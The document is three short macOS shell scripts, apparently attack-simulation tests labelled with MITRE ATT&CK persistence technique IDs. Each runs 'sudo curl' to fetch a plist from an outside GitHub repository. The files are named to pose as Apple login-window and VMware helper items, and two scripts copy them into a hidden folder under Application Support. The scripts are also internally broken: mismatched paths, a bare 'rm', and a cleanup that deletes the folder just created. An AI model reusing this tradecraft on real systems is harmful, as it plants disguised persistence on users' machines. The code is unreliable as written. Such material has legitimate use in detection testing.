#!/usr/bin/env sh
# ATTACK_PERSISTENCE_T1543_MACOS_CP_LAUNCHAGENTS_BPLIST
sudo curl https://github.com/Pratik-987/Macos/raw/main/com.apple.loginwindow.plist -o /tmp/com.apple.loginwindow.plist
cp ~/tmp/com.apple.loginwindow.plist ~/



#!/usr/bin/env sh
#ATTACK_PERSISTENCE_T1159_MACOS_FILE_PLIST_HIDDEN_APP
sudo curl https://raw.githubusercontent.com/Pratik-987/Macos/main/com.vmware.IDHelper.plist -o ~/Downloads/com.vmware.IDHelper.plist
mkdir ~/Library/Application\ Support/tmp
mkdir ~/Library/Application\ Support/tmp/.tmp1
cp ~/Downloads/com.vmware.IDHelper.plist ~/Library/Application\ Support/tmp/.tmp1/
rm

#!/usr/bin/env sh
#ATTACK_PERSISTENCE_T1159_MACOS_FILE_PLIST_HIDDEN_APP
sudo curl https://raw.githubusercontent.com/Pratik-987/Macos/main/com.apple.loginwindow.plist -o ~/Downloads/com.apple.loginwindow.plist
mkdir ~/Library/Application\ Support/tmp
mkdir ~/Library/Application\ Support/tmp/.tmp1
cp ~/Downloads/com.apple.loginwindow.plist ~/Library/Application\ Support/tmp/.tmp1/
rm -rf -R ~/Library/Application\ Support/tmp